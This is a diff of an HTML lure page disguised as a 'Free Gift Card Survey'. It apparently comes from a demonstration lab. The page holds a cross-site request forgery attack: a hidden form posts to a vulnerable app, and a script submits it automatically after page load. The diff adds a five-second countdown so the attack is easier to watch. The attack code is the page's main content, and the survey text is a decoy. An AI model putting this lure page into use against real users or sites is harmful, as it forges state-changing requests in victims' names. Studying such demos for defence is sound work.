@@ -6,7 +6,9 @@
 </head>
 <body>
   <h1>Free Gift Card Survey</h1>
-  <p>Thanks for visiting! Please wait while we load your survey...</p>
+  <p id="status">
+    Thanks for visiting! Please wait while we load your survey...
+  </p>
 
   <!--
     This form silently submits a POST request to the vulnerable app.
@@ -18,10 +20,24 @@
   </form>
 
   <script>
-    // Auto-submit as soon as the page loads.
-    window.addEventListener("load", function () {
-      document.getElementById("csrf-attack").submit();
-    });
+    // Delay the attack so it's easier to see what's happening.
+    const status = document.getElementById("status");
+    let seconds = 5;
+
+    function updateStatus() {
+      status.textContent =
+        "Loading your survey... (submitting in " + seconds + " seconds)";
+      seconds--;
+
+      if (seconds < 0) {
+        status.textContent = "Submitting request now...";
+        document.getElementById("csrf-attack").submit();
+      } else {
+        setTimeout(updateStatus, 1000);
+      }
+    }
+
+    window.addEventListener("load", updateStatus);
   </script>
 </body>
 </html>
